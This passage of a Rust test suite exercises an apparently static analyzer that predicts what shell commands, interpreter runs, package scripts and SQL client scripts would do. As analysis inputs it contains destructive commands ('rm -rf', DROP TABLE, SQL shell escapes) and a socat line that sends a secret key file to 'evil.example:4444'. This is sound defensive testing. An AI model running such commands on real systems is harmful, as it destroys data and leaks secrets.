//! Source resolution for one invocation: which files an invocation reaches,
//! which it must not, and where the walk ends in a typed boundary instead.
//!
//! These are engine and resolver semantics, exercised through the library the
//! way a consumer calls it — `Engine::analyze_with_resolver` over a subject and
//! a `ShallowSourceResolver` rooted at the invocation's working directory.
#![allow(clippy::disallowed_methods, clippy::disallowed_types)]

use std::path::{Path, PathBuf};
use std::sync::atomic::{AtomicU64, Ordering};

use effinterp_engine::{Engine, default_limits};
use effinterp_proto::{HostContext, PathPlatform, Subject, normalize_path};
use effinterp_repo::ShallowSourceResolver;

static NEXT: AtomicU64 = AtomicU64::new(0);

struct TempRoot(PathBuf);

impl TempRoot {
    fn new() -> Self {
        let path = std::env::temp_dir().join(format!(
            "effinterp-invocation-sources-{}-{}",
            std::process::id(),
            NEXT.fetch_add(1, Ordering::Relaxed)
        ));
        std::fs::create_dir_all(&path).unwrap();
        let fixtures = Path::new(env!("CARGO_MANIFEST_DIR"))
            .join("../effinterp-bench/fixtures/invocation-sources");
        fn copy_tree(source: &Path, destination: &Path) {
            std::fs::create_dir_all(destination).unwrap();
            for entry in std::fs::read_dir(source).unwrap() {
                let entry = entry.unwrap();
                let target = destination.join(entry.file_name());
                if entry.file_type().unwrap().is_dir() {
                    copy_tree(&entry.path(), &target);
                } else {
                    std::fs::copy(entry.path(), target).unwrap();
                }
            }
        }
        copy_tree(&fixtures, &path);
        Self(path)
    }
}

impl Drop for TempRoot {
    fn drop(&mut self) {
        let _ = std::fs::remove_dir_all(&self.0);
    }
}

/// Analyze `subject` with a resolver rooted at `root`.
///
/// `anchored` says whether the subject names that directory as its own working
/// directory. When it does not, the resolver still reads from `root` — that is
/// what a process launched there would see — but the subject carries no cwd,
/// so nothing may resolve against an absolute anchor.
fn analyze(
    root: &Path,
    subject: &Subject,
    anchored: bool,
    overrides: &[(&str, u64)],
) -> serde_json::Value {
    let mut limits = default_limits();
    for (name, value) in overrides {
        limits.insert((*name).to_string(), *value);
    }
    let engine = Engine::with_limits(limits).unwrap();
    let anchor = if anchored {
        normalize_path(root.to_str().unwrap(), PathPlatform::Posix)
    } else {
        String::new()
    };
    // A cwd may name a directory this host does not have, where no local source
    // is readable; analysis still runs, without a resolver.
    let resolver = ShallowSourceResolver::new(root, &anchor, engine.limits().max_source_bytes);
    let plan = match &resolver {
        Ok(resolver) => engine.analyze_with_resolver(subject, resolver).unwrap(),
        Err(_) => engine.analyze(subject).unwrap(),
    };
    effinterp_proto::validate_plan(&plan).unwrap();
    serde_json::to_value(&plan).unwrap()
}

fn cwd_of(root: &Path, cwd: bool) -> Option<String> {
    cwd.then(|| root.to_str().unwrap().to_string())
}

fn run(root: &Path, subject: &str, arguments: &[String], cwd: bool) -> serde_json::Value {
    let context = HostContext::default();
    let subject = match subject {
        "shell" => Subject::Shell {
            source: arguments.join(" "),
            cwd: cwd_of(root, cwd),
            context,
        },
        "exec" => Subject::Exec {
            argv: arguments.to_vec(),
            cwd: cwd_of(root, cwd),
            context,
        },
        other => panic!("unsupported subject {other}"),
    };
    analyze(root, &subject, cwd, &[])
}

fn exec(root: &Path, argv: &[&str], cwd: bool) -> serde_json::Value {
    run(
        root,
        "exec",
        &argv.iter().map(|arg| arg.to_string()).collect::<Vec<_>>(),
        cwd,
    )
}

fn has_effect(plan: &serde_json::Value, operation: &str, resource: &str) -> bool {
    plan["effects"].as_array().unwrap().iter().any(|effect| {
        effect["operation"] == operation && effect["resource"].to_string().contains(resource)
    })
}

fn has_boundary(plan: &serde_json::Value, reason: &str, limit: Option<&str>) -> bool {
    plan["boundaries"]
        .as_array()
        .into_iter()
        .flatten()
        .any(|boundary| {
            boundary["reason"] == reason
                && limit.is_none_or(|limit| boundary["limit"].as_str() == Some(limit))
        })
}

#[test]
fn invoked_source_files_are_nested_for_each_interpreter_and_shebang() {
    let root = TempRoot::new();
    for (argv, resource) in [
        (&["python3", "x.py"][..], "/nested-python"),
        (&["bash", "x.sh"][..], "/nested-shell"),
        (&["node", "x.js"][..], "/nested-node"),
        (&["ruby", "x.rb"][..], "/nested-ruby"),
        (&["php", "x.php"][..], "/nested-php"),
        (&["./deploy"][..], "/nested-shebang"),
    ] {
        let plan = exec(&root.0, argv, true);
        assert!(has_effect(&plan, "filesystem.delete", resource), "{argv:?}");
        assert!(has_effect(
            &plan,
            "filesystem.read",
            argv.last().unwrap().trim_start_matches("./")
        ));
        assert!(plan["effects"].as_array().unwrap().iter().any(|effect| {
            effect["operation"] == "process.code_execution"
                && effect["attributes"]["source"] == "file"
        }));
        // Only the Python program imports helpers; its import-time effect is reached.
        assert_eq!(
            has_effect(&plan, "filesystem.delete", "/helpers-sentinel"),
            argv[0] == "python3",
            "{argv:?}"
        );
    }
}

#[test]
fn launcher_forms_handoff_to_the_inner_command() {
    let root = TempRoot::new();
    for argv in [
        &["uv", "run", "x.py"][..],
        &["uv", "run", "python3", "x.py"][..],
        &["uvx", "x.py"][..],
        &["poetry", "run", "python3", "x.py"][..],
        &["pipx", "run", "x.py"][..],
        &["npx", "python3", "x.py"][..],
    ] {
        let plan = exec(&root.0, argv, true);
        assert!(
            has_effect(&plan, "filesystem.delete", "/nested-python"),
            "{argv:?}"
        );
    }
}

#[test]
fn missing_and_oversize_sources_are_typed_boundaries() {
    let root = TempRoot::new();
    let missing = exec(&root.0, &["python3", "missing.py"], true);
    assert!(has_boundary(&missing, "unrecoverable_source", None));
    assert!(
        missing["boundaries"]
            .as_array()
            .unwrap()
            .iter()
            .any(|boundary| {
                boundary["detail"]
                    .as_str()
                    .is_some_and(|detail| detail.ends_with(": missing"))
            })
    );

    std::fs::write(root.0.join("large.py"), vec![b'x'; 4 * 1024 * 1024 + 1]).unwrap();
    let large = exec(&root.0, &["python3", "large.py"], true);
    assert!(has_boundary(
        &large,
        "limit_saturated",
        Some("max_source_bytes")
    ));
}

#[test]
fn distinct_source_limit_and_process_cwd_root_are_enforced() {
    let root = TempRoot::new();
    let from_process_cwd = exec(&root.0, &["python3", "x.py"], false);
    assert!(has_effect(
        &from_process_cwd,
        "filesystem.delete",
        "/nested-python"
    ));

    let mut commands = Vec::new();
    for index in 0..65 {
        let name = format!("source-{index}.py");
        std::fs::write(
            root.0.join(&name),
            format!("import os\nos.remove('/source-{index}')\n"),
        )
        .unwrap();
        commands.push(format!("python3 {name}"));
    }
    let shell = run(&root.0, "shell", &[commands.join("\n")], true);
    assert!(has_boundary(
        &shell,
        "limit_saturated",
        Some("max_resolved_source_files")
    ));
    assert!(has_effect(&shell, "filesystem.delete", "/source-63"));
    assert!(!has_effect(&shell, "filesystem.delete", "/source-64"));
}

#[test]
fn process_cwd_root_does_not_shadow_absolute_host_sources() {
    let root = TempRoot::new();
    std::fs::create_dir(root.0.join("etc")).unwrap();
    std::fs::write(
        root.0.join("etc/passwd.py"),
        "import os\nos.remove('/shadowed-host-source')\n",
    )
    .unwrap();

    let plan = exec(&root.0, &["python3", "/etc/passwd.py"], false);

    assert!(has_boundary(&plan, "unrecoverable_source", None));
    assert!(!has_effect(
        &plan,
        "filesystem.delete",
        "/shadowed-host-source"
    ));
}

#[test]
fn shallow_resolver_retains_a_boundary_for_go_package_closure() {
    let root = TempRoot::new();
    let package = root.0.join("cmd/app");
    std::fs::create_dir_all(&package).unwrap();
    std::fs::write(
        package.join("main.go"),
        "package main\nfunc main() { helper() }\n",
    )
    .unwrap();
    std::fs::write(
        package.join("helper.go"),
        "package main\nimport \"os\"\nfunc helper() { os.RemoveAll(\"/go-helper-output\") }\n",
    )
    .unwrap();

    let plan = exec(&root.0, &["go", "run", "./cmd/app"], true);

    assert!(has_boundary(&plan, "unrecoverable_source", None));
    assert!(!has_effect(&plan, "filesystem.delete", "/go-helper-output"));
}

#[test]
fn nonlocal_cwd_keeps_analysis_available_without_a_resolver() {
    let root = TempRoot::new();
    let nonlocal_cwd = root.0.join("absent-workspace");

    let exec_plan = exec(&nonlocal_cwd, &["rm", "-rf", "/exec-output"], true);
    assert!(has_effect(&exec_plan, "filesystem.delete", "/exec-output"));

    let shell_plan = run(
        &nonlocal_cwd,
        "shell",
        &["rm -rf /shell-output".to_string()],
        true,
    );
    assert!(has_effect(
        &shell_plan,
        "filesystem.delete",
        "/shell-output"
    ));
}

#[test]
fn package_manager_options_never_select_a_script_in_the_wrong_cwd() {
    let root = TempRoot::new();
    std::fs::write(
        root.0.join("package.json"),
        r#"{"scripts":{"lint":"echo ROOT_ONLY","app":"echo WRONG_APP"}}"#,
    )
    .unwrap();
    std::fs::create_dir(root.0.join("app")).unwrap();
    std::fs::write(
        root.0.join("app/package.json"),
        r#"{"scripts":{"lint":"touch actual-child-output"}}"#,
    )
    .unwrap();

    for argv in [
        &["pnpm", "--dir=app", "run", "lint"][..],
        &["pnpm", "--dir", "app", "run", "lint"][..],
        &["npm", "--prefix", "app", "run", "lint"][..],
        &["npm", "--prefix=app", "run", "lint"][..],
        &["npm", "run", "lint", "--prefix", "app"][..],
        &["npm", "run", "lint", "--prefix=app"][..],
        &["npm", "run", "--prefix=app", "lint"][..],
        &["npm", "test", "--prefix=app"][..],
        &["yarn", "--cwd", "app", "lint"][..],
        &["yarn", "--cwd=app", "run", "lint"][..],
        &["pnpm", "-C", "app", "run", "lint"][..],
        &["bun", "--unknown", "run", "lint"][..],
    ] {
        let plan = exec(&root.0, argv, true);
        assert!(
            has_boundary(&plan, "unresolved_package_script", None),
            "{argv:?}"
        );
        assert!(
            !has_effect(&plan, "filesystem.read", "package.json"),
            "{argv:?}"
        );
        assert!(
            plan["execution_graph"]["edges"]
                .as_array()
                .is_none_or(|edges| !edges.iter().any(|edge| edge["kind"] == "package_script")),
            "{argv:?}"
        );
        for domain in ["filesystem", "network", "process"] {
            assert_eq!(
                plan["coverage"][domain]["level"], "partial",
                "{argv:?}: {domain}"
            );
        }
    }
    // Bun's global `--cwd` moves the whole invocation, manifest included.
    for argv in [
        &["bun", "--cwd=app", "run", "lint"][..],
        &["bun", "--cwd", "app", "lint"][..],
    ] {
        let plan = exec(&root.0, argv, true);
        let sources = plan["execution_graph"]["nodes"]
            .as_array()
            .unwrap()
            .iter()
            .filter_map(|node| node["subject"]["source"].as_str())
            .collect::<Vec<_>>();
        assert_eq!(sources, ["touch actual-child-output"], "{argv:?}");
    }
    let plan = exec(
        &root.0,
        &["npm", "run", "lint", "--", "--prefix", "app"],
        true,
    );
    assert!(
        plan["execution_graph"]["nodes"]
            .as_array()
            .unwrap()
            .iter()
            .any(|node| node["subject"]["source"] == "echo ROOT_ONLY '--prefix' 'app'")
    );
    assert!(
        plan["boundaries"]
            .as_array()
            .is_none_or(|boundaries| boundaries.is_empty())
    );
}

#[test]
fn package_scripts_and_make_recipes_resolve_in_the_invocation_cwd() {
    let root = TempRoot::new();
    for (argv, manifest, edge_kind, expected) in [
        (
            &["npm", "run", "test"][..],
            "package.json",
            "package_script",
            "/package-main",
        ),
        (
            &["npm", "test"][..],
            "package.json",
            "package_script",
            "/package-main",
        ),
        (
            &["yarn", "test"][..],
            "package.json",
            "package_script",
            "/package-main",
        ),
        (
            &["pnpm", "run", "test"][..],
            "package.json",
            "package_script",
            "/package-main",
        ),
        (
            &["bun", "run", "test"][..],
            "package.json",
            "package_script",
            "/package-main",
        ),
        (
            &["make", "-f", "Makefile", "deploy"][..],
            "Makefile",
            "build_target",
            "/make-main",
        ),
    ] {
        let plan = exec(&root.0, argv, true);
        assert!(has_effect(&plan, "filesystem.read", manifest), "{argv:?}");
        assert!(has_effect(&plan, "filesystem.delete", expected), "{argv:?}");
        for path in ["/package-helper", "/unfollowed-helper"] {
            assert!(!has_effect(&plan, "filesystem.delete", path), "{argv:?}");
        }
        assert!(
            has_boundary(&plan, "unrecoverable_source", None),
            "{argv:?}"
        );
        assert!(
            plan["execution_graph"]["nodes"]
                .as_array()
                .unwrap()
                .iter()
                .all(|node| {
                    let node: effinterp_proto::ExecutionNode =
                        serde_json::from_value(node.clone()).unwrap();
                    !node
                        .selected_source_path()
                        .is_some_and(|path| path.ends_with("scripts/helper.py"))
                })
        );
        let edges: Vec<_> = plan["execution_graph"]["edges"]
            .as_array()
            .unwrap()
            .iter()
            .filter(|edge| edge["kind"] == edge_kind)
            .collect();
        assert_eq!(
            edges.len(),
            if edge_kind == "package_script" { 3 } else { 2 }
        );
        let read = plan["effects"]
            .as_array()
            .unwrap()
            .iter()
            .find(|effect| {
                effect["operation"] == "filesystem.read"
                    && effect["resource"].to_string().contains(manifest)
            })
            .unwrap();
        assert!(edges.iter().all(|edge| {
            read["provenance"]
                .as_array()
                .unwrap()
                .iter()
                .all(|node| edge["evidence"].as_array().unwrap().contains(node))
        }));
        if edge_kind == "package_script" {
            let sources: Vec<_> = edges.iter().map(|edge| plan["execution_graph"]["nodes"][edge["to"].as_u64().unwrap() as usize]["subject"]["source"].as_str().unwrap()).collect();
            assert_eq!(
                sources,
                [
                    "rm /package-pre",
                    "rm /package-main; python3 scripts/helper.py",
                    "rm /package-post"
                ]
            );
        }
    }
    for argv in [
        &["npm", "run", "missing"][..],
        &["make", "missing"][..],
        &["make", "recursive"][..],
    ] {
        let plan = exec(&root.0, argv, true);
        assert!(has_boundary(
            &plan,
            if argv[0] == "make" {
                "unresolved_build_target"
            } else {
                "unresolved_package_script"
            },
            None
        ));
    }
    std::fs::write(root.0.join("package.json"), vec![b'x'; 4 * 1024 * 1024 + 1]).unwrap();
    let oversized = exec(&root.0, &["npm", "test"], true);
    assert!(has_boundary(
        &oversized,
        "limit_saturated",
        Some("max_source_bytes")
    ));
}

#[test]
fn shell_source_patterns_follow_checkout_files_from_absolute_cwd() {
    let root = TempRoot::new();
    let script = root.0.join("test/e2e.sh");
    let source = std::fs::read_to_string(&script).unwrap();
    std::fs::write(script, format!("{source}\ntouch \"$SRC\"\n")).unwrap();
    for cwd in [false, true] {
        let plan = exec(&root.0, &["bash", "bin/dispatch.sh"], cwd);
        assert!(!has_boundary(&plan, "unresolved_source", None), "{plan}");
        assert!(!has_boundary(&plan, "unmodeled_command", None), "{plan}");
        for (operation, path) in [
            ("filesystem.metadata", "/tmp/util-marker"),
            ("git.remote_sync", ""),
            ("filesystem.delete", "/tmp/cache"),
            ("filesystem.read", "Cellar"),
        ] {
            assert!(
                has_effect(&plan, operation, path),
                "missing {operation} {path}: {plan}"
            );
        }
        for (path, conditional) in [
            ("/tmp/util-marker", false),
            ("/tmp/cache", true),
            ("Cellar", true),
        ] {
            assert!(plan["effects"].as_array().unwrap().iter().any(|effect| {
                effect["resource"].to_string().contains(path)
                    && effect["condition"].is_null() != conditional
            }));
        }
        assert!(
            plan["effects"]
                .as_array()
                .unwrap()
                .iter()
                .filter(|effect| effect["operation"] == "git.remote_sync")
                .all(|effect| !effect["condition"].is_null())
        );
        assert_eq!(
            plan["execution_graph"]["nodes"]
                .as_array()
                .unwrap()
                .iter()
                .filter(|node| node["input"]["assurance"] == "alternatives")
                .count(),
            3
        );
        let plan = exec(&root.0, &["bash", "test/e2e.sh"], cwd);
        assert!(!has_boundary(&plan, "unresolved_source", None), "{plan}");
        assert!(!has_boundary(&plan, "unmodeled_command", None), "{plan}");
        assert!(has_effect(&plan, "process.exec", "bash"));
        let directory = if cwd {
            root.0.join("test")
        } else {
            PathBuf::from("test")
        };
        assert!(
            plan["effects"].as_array().unwrap().iter().any(|effect| {
                effect["operation"] == "filesystem.metadata"
                    && effect["resource"]["identity"]["path"]
                        == directory.to_string_lossy().as_ref()
            }),
            "{plan}"
        );
    }
    let plan = analyze(
        &root.0,
        &Subject::Exec {
            argv: vec!["bash".to_string(), "bin/dispatch.sh".to_string()],
            cwd: cwd_of(&root.0, true),
            context: HostContext::default(),
        },
        true,
        &[("max_source_alternatives", 2)],
    );
    let boundaries: Vec<_> = plan["boundaries"]
        .as_array()
        .unwrap()
        .iter()
        .filter(|boundary| boundary["limit"] == "max_source_alternatives")
        .collect();
    assert_eq!(boundaries.len(), 1);
    assert!(
        boundaries[0]["detail"]
            .as_str()
            .unwrap()
            .contains("3 files")
    );
}

#[test]
fn path_dependencies_preserve_launch_argv_and_root_confinement() {
    let root = TempRoot::new();
    for cwd in [true, false] {
        for command in ["./bin/tool x", "node bin/tool x", "bash scripts/run.sh x"] {
            let plan = run(&root.0, "shell", &[command.to_string()], cwd);
            let nodes = plan["execution_graph"]["nodes"].as_array().unwrap();
            let (imported_index, imported) = nodes
                .iter()
                .enumerate()
                .find(|(_, node)| {
                    node["input"]["selected"]["identity"]["path"]
                        .as_str()
                        .is_some_and(|origin| {
                            origin == "lib/cli.js" || origin.ends_with("/lib/cli.js")
                        })
                })
                .unwrap_or_else(|| panic!("{command}: {plan:#}"));
            assert_eq!(imported["input"]["content"]["kind"], "observed");
            assert_eq!(imported["argv"][2]["value"], "x");
            assert!(
                plan["execution_graph"]["edges"]
                    .as_array()
                    .unwrap()
                    .iter()
                    .any(|edge| { edge["kind"] == "import" && edge["to"] == imported_index })
            );
            assert!(
                nodes.iter().any(|node| {
                    node["subject"]["argv"] == serde_json::json!(["git", "fetch", "x"])
                }),
                "{command}: {plan:#}"
            );
            assert!(!plan.to_string().contains("dependency_not_traversed"));
        }
    }
    std::fs::write(
        root.0.join("bin/tool"),
        "#!/usr/bin/env node\nrequire('commander');\n",
    )
    .unwrap();
    let bare = exec(&root.0, &["node", "bin/tool", "x"], true);
    assert!(bare.to_string().contains("dependency_not_traversed"));
    std::fs::write(
        root.0.join("bin/tool"),
        "#!/usr/bin/env node\nrequire('../../outside.js');\n",
    )
    .unwrap();
    let outside = exec(&root.0, &["node", "bin/tool", "x"], true);
    assert!(outside.to_string().contains("escapes"));
}

#[cfg(unix)]
#[test]
fn filesystem_alias_writes_refuse_stale_invocation_sources() {
    use std::os::unix::fs::symlink;

    let root = TempRoot::new();
    std::fs::write(root.0.join("real.sh"), "rm -rf /ondisk-real\n").unwrap();
    std::fs::write(root.0.join("data.txt"), "unrelated\n").unwrap();
    symlink("real.sh", root.0.join("link.sh")).unwrap();
    std::fs::hard_link(root.0.join("real.sh"), root.0.join("hard.sh")).unwrap();
    std::fs::create_dir(root.0.join("realdir")).unwrap();
    std::fs::write(root.0.join("realdir/t.sh"), "rm -rf /ondisk-dir\n").unwrap();
    symlink("realdir", root.0.join("ldir")).unwrap();
    std::fs::write(
        root.0.join("lib/h.py"),
        "import os\nos.remove('/ondisk-python')\n",
    )
    .unwrap();
    symlink("lib", root.0.join("libl")).unwrap();
    std::fs::write(root.0.join("imports.py"), "import h\n").unwrap();

    for cwd in [true, false] {
        for command in [
            "echo 'rm -rf /predicted' > real.sh; bash link.sh",
            "echo 'rm -rf /predicted' > link.sh; bash real.sh",
            "echo 'rm -rf /predicted' > real.sh; bash hard.sh",
            "echo 'rm -rf /predicted' > hard.sh; bash real.sh",
            "echo 'rm -rf /predicted' > realdir/t.sh; bash ldir/t.sh",
            "echo 'rm -rf /predicted' > ldir/t.sh; bash realdir/t.sh",
            "echo 'rm -rf /predicted' > real.sh & bash link.sh",
            "bash link.sh | echo 'rm -rf /predicted' > real.sh",
            "for i in 1 2; do bash link.sh; echo 'rm -rf /predicted' > real.sh; done",
            "echo 'rm -rf /predicted' > real.sh; echo unknown > link.sh; echo more >> real.sh; bash real.sh",
            "echo unknown > libl/h.py; PYTHONPATH=lib python3 -S imports.py",
            "ln -sf real.sh new.sh & echo 'rm -rf /predicted' > new.sh; bash real.sh",
            "for i in 1 2; do bash real.sh; ln -sf real.sh new.sh; echo 'rm -rf /predicted' > new.sh; done",
        ] {
            let plan = run(&root.0, "shell", &[command.to_string()], cwd);
            assert!(
                !has_effect(&plan, "filesystem.delete", "/ondisk-"),
                "{command}: {plan:#}"
            );
            assert!(
                !has_effect(&plan, "filesystem.delete", "/predicted"),
                "{command}: {plan:#}"
            );
            assert!(
                plan["execution_graph"]["nodes"]
                    .as_array()
                    .unwrap()
                    .iter()
                    .any(|node| {
                        matches!(
                            node["input"]["content"]["reason"]["kind"].as_str(),
                            Some("stale" | "ambiguous")
                        )
                    }),
                "{command}: {plan:#}"
            );
        }
        // Observed disjoint paths retain disk evidence, and a later full
        // overwrite can establish exact bytes after an aliased mutation.
        for (command, expected) in [
            ("echo unrelated > other.sh; bash link.sh", "/ondisk-real"),
            ("echo hi > data.txt; bash real.sh", "/ondisk-real"),
            ("echo hi >> data.txt; bash link.sh", "/ondisk-real"),
            ("rm data.txt; bash hard.sh", "/ondisk-real"),
            (
                "sed -i '' s/d/e/ data.txt; PYTHONPATH=lib python3 -S imports.py",
                "/ondisk-python",
            ),
            (
                "echo hi > real.sh; PYTHONPATH=lib python3 -S imports.py",
                "/ondisk-python",
            ),
            (
                "ln -sf real.sh new.sh; echo 'rm -rf /recovered' > new.sh; bash new.sh",
                "/recovered",
            ),
            (
                "mkdir newdir; echo 'rm -rf /recovered' > newdir/script.sh; bash newdir/script.sh",
                "/recovered",
            ),
            (
                "echo unknown > link.sh; echo 'rm -rf /recovered' > real.sh; bash real.sh",
                "/recovered",
            ),
            // A link this invocation created names a file the walk can follow,
            // so the overwrite through it lands on bytes the later read knows.
            (
                "ln -sf real.sh new.sh; echo 'rm -rf /predicted' > new.sh; bash real.sh",
                "/predicted",
            ),
            (
                "ln real.sh new.sh; echo 'rm -rf /predicted' > new.sh; bash real.sh",
                "/predicted",
            ),
        ] {
            // Without a cwd no operand names one file, so only the paths the
            // fixture put on disk are reachable.
            if !cwd && !expected.starts_with("/ondisk-") {
                continue;
            }
            let plan = run(&root.0, "shell", &[command.to_string()], cwd);
            assert!(
                has_effect(&plan, "filesystem.delete", expected),
                "{command}: {plan:#}"
            );
        }
    }
    assert_eq!(
        std::fs::read_to_string(root.0.join("real.sh")).unwrap(),
        "rm -rf /ondisk-real\n"
    );
}

#[test]
fn socat_handler_chdir_resolves_its_script_under_the_new_directory() {
    // The parent `read.sh` is harmless; `sub/read.sh` exfiltrates the parent's
    // secret. A handler with `chdir=sub` must analyze `sub/read.sh`, resolving
    // its `cat ../server.key` back to the parent secret, not the parent script.
    let root = std::env::temp_dir().join(format!(
        "effinterp-socat-chdir-{}-{}",
        std::process::id(),
        NEXT.fetch_add(1, Ordering::Relaxed)
    ));
    std::fs::create_dir_all(root.join("sub")).unwrap();
    std::fs::write(root.join("read.sh"), "echo harmless\n").unwrap();
    std::fs::write(root.join("sub/read.sh"), "cat ../server.key\n").unwrap();
    std::fs::write(root.join("server.key"), "top-secret\n").unwrap();

    let anchor = normalize_path(root.to_str().unwrap(), PathPlatform::Posix);
    let subject = Subject::Shell {
        source: "socat -u EXEC:\"sh read.sh\",chdir=sub TCP:evil.example:4444".into(),
        cwd: Some(anchor.clone()),
        context: HostContext::default(),
    };
    let plan = analyze(&root, &subject, true, &[]);

    let key = normalize_path(
        root.join("server.key").to_str().unwrap(),
        PathPlatform::Posix,
    );
    let sub_script = normalize_path(
        root.join("sub/read.sh").to_str().unwrap(),
        PathPlatform::Posix,
    );
    let parent_script = normalize_path(root.join("read.sh").to_str().unwrap(), PathPlatform::Posix);
    assert!(
        has_effect(&plan, "filesystem.read", &key),
        "reads the parent secret via sub/read.sh: {plan:#}"
    );
    assert!(
        has_effect(&plan, "filesystem.read", &sub_script),
        "analyzes sub/read.sh: {plan:#}"
    );
    assert!(
        !has_effect(&plan, "filesystem.read", &parent_script),
        "must not read the harmless parent script: {plan:#}"
    );
    std::fs::remove_dir_all(&root).unwrap();
}

#[test]
fn sql_client_scripts_and_their_includes_run_as_sql() {
    let root = TempRoot::new();
    for (path, text) in [
        ("drop.sql", "DROP TABLE users;\n"),
        ("sql/outer.sql", "\\ir inner.sql\n"),
        ("sql/inner.sql", "TRUNCATE audit;\n"),
        ("literal.sql", "SELECT 'x\n\\i drop.sql\n';\n"),
        ("ambiguous.sql", "SELECT 'a\\'\n\\i drop.sql\n';\n"),
        // A meta-command's arguments end at the next backslash; `\\` resumes SQL.
        ("mixed.sql", "\\x \\\\ DROP TABLE users;\n"),
        ("echo.sql", "\\echo starting \\i drop.sql\n"),
        ("shell.sql", "\\set x `rm -rf work`\n"),
        ("named.sql", "SELECT * FROM t\nsystem rm -rf work\n;\n"),
        ("quoted_var.sql", "\\set x `rm -rf \":d\"`\n"),
        ("var.sql", "DROP TABLE :t;\n"),
        ("fan.sql", "\\i fan.sql\n\\i fan.sql\n\\i fan.sql\n"),
    ] {
        let path = root.0.join(path);
        std::fs::create_dir_all(path.parent().unwrap()).unwrap();
        std::fs::write(path, text).unwrap();
    }
    for argv in [
        &["psql", "-f", "drop.sql"][..],
        &["psql", "-f", "mixed.sql"],
        &["psql", "-f", "echo.sql"],
        &["mysql", "-e", "source drop.sql"],
        &["sqlite3", "app.db", ".read drop.sql"],
        &["duckdb", "-f", "drop.sql"],
        &["sqlcmd", "-Q", "SELECT 1\nGO\n:r drop.sql"],
        &["snowsql", "-q", "!source drop.sql"],
        &["cqlsh", "-e", "SOURCE 'drop.sql'"],
        &["clickhouse-client", "--queries-file", "drop.sql"],
    ] {
        let plan = exec(&root.0, argv, true);
        assert!(
            has_effect(&plan, "database.schema_drop", "\"users\""),
            "{argv:?}"
        );
    }
    // `\ir` resolves against the including script's directory.
    let plan = exec(&root.0, &["psql", "-f", "sql/outer.sql"], true);
    assert!(has_effect(&plan, "database.truncate", "\"audit\""));
    // A command-shaped line inside a string literal is SQL text.
    let plan = exec(&root.0, &["psql", "-f", "literal.sql"], true);
    assert!(!has_effect(&plan, "database.schema_drop", "\"users\""));
    // Only a server without backslash escapes ends this literal before the
    // include; that reading runs it, and the gap records the ambiguity.
    let plan = exec(&root.0, &["psql", "-f", "ambiguous.sql"], true);
    assert!(has_effect(&plan, "database.schema_drop", "\"users\""));
    assert!(has_boundary(&plan, "unrecoverable_source", None));
    // psql runs backquoted meta-command arguments as shell commands.
    for argv in [
        &["psql", "-c", "\\set x `rm -rf work`"][..],
        &["psql", "-f", "shell.sql"],
    ] {
        let plan = exec(&root.0, argv, true);
        assert!(has_effect(&plan, "filesystem.delete", "work"), "{argv:?}");
    }
    // psql interpolates variables into backquoted text whatever its shell
    // quoting, so the target is unknown.
    let plan = exec(&root.0, &["psql", "-f", "quoted_var.sql"], true);
    assert!(!has_effect(&plan, "filesystem.delete", ":d"));
    assert!(has_boundary(&plan, "unrecoverable_source", None));
    // mysql hands the shell the whole rest of the line, `;` included.
    for argv in [
        &["mysql", "-e", "system true; rm -rf work"][..],
        &["mysql", "-e", "\\! true; rm -rf work"],
    ] {
        let plan = exec(&root.0, argv, true);
        assert!(has_effect(&plan, "filesystem.delete", "work"), "{argv:?}");
    }
    // With -G mysql runs a named command that starts a line mid-statement;
    // without it (or after --skip-named-commands) the line is SQL.
    let plan = exec(&root.0, &["mysql", "-G", "-e", "source named.sql"], true);
    assert!(has_effect(&plan, "filesystem.delete", "work"));
    for argv in [
        &["mysql", "-e", "source named.sql"][..],
        &[
            "mysql",
            "-G",
            "--skip-named-commands",
            "-e",
            "source named.sql",
        ],
    ] {
        let plan = exec(&root.0, argv, true);
        assert!(!has_effect(&plan, "filesystem.delete", "work"), "{argv:?}");
    }
    // sqlite rebuilds a quoted .shell line, so only unquoted text is nested.
    let plan = exec(&root.0, &["sqlite3", "app.db", ".shell rm -rf work"], true);
    assert!(has_effect(&plan, "filesystem.delete", "work"));
    let plan = exec(
        &root.0,
        &["sqlite3", "app.db", ".shell echo 'a;rm' -rf work"],
        true,
    );
    assert!(!has_effect(&plan, "filesystem.delete", "work"));
    assert!(has_boundary(&plan, "unrecoverable_source", None));
    // psql interpolates variables into script SQL, so the table is unknown.
    let plan = exec(&root.0, &["psql", "-v", "t=users", "-f", "var.sql"], true);
    assert!(!has_effect(&plan, "database.schema_drop", "\"t\""));
    assert!(has_boundary(&plan, "unrecoverable_source", None));
    // A -c string is one meta-command or verbatim SQL, never a script.
    let plan = exec(&root.0, &["psql", "-c", "SELECT 1; \\i drop.sql"], true);
    assert!(!has_effect(&plan, "database.schema_drop", "\"users\""));
    // A script that includes itself is a boundary, not a runaway analysis.
    let plan = exec(&root.0, &["psql", "-f", "fan.sql"], true);
    assert!(has_boundary(&plan, "unrecoverable_source", None));
    // Connection switches carry an explicit host, and `.open` writes its file.
    let plan = exec(
        &root.0,
        &[
            "psql",
            "-d",
            "app",
            "-c",
            "\\c other someone otherhost",
            "-c",
            "DROP TABLE t",
        ],
        true,
    );
    assert!(has_effect(&plan, "network.connect", "\"otherhost\""));
    assert!(has_effect(&plan, "database.schema_drop", "\"otherhost\""));
    // mysql `connect` takes a host; `use` takes only a database.
    let plan = exec(
        &root.0,
        &[
            "mysql",
            "app",
            "-e",
            "connect prod otherhost; DROP TABLE t;",
        ],
        true,
    );
    assert!(has_effect(&plan, "network.connect", "\"otherhost\""));
    let plan = exec(
        &root.0,
        &["mysql", "app", "-e", "use prod extra; DROP TABLE t;"],
        true,
    );
    assert!(!has_effect(&plan, "network.connect", "\"extra\""));
    assert!(has_effect(&plan, "database.schema_drop", "\"prod\""));
    // A Snowflake account names the server, with its region when given; a
    // named connection's account is in configuration we cannot read.
    for (argv, host) in [
        (
            &[
                "snowsql",
                "-a",
                "xy1",
                "--region",
                "us-east-1",
                "-q",
                "DROP TABLE t",
            ][..],
            "\"xy1.us-east-1.snowflakecomputing.com\"",
        ),
        (
            &["snowsql", "-a", "xy1", "-q", "DROP TABLE t"],
            "\"xy1.snowflakecomputing.com\"",
        ),
    ] {
        let plan = exec(&root.0, argv, true);
        assert!(has_effect(&plan, "network.connect", host), "{argv:?}");
    }
    for argv in [
        &["snowsql", "-a", "", "-q", "DROP TABLE t"][..],
        &["snowsql", "-a", "xy1", "--region", "", "-q", "DROP TABLE t"],
    ] {
        let plan = exec(&root.0, argv, true);
        assert!(
            has_effect(&plan, "network.connect", "unresolved"),
            "{argv:?}"
        );
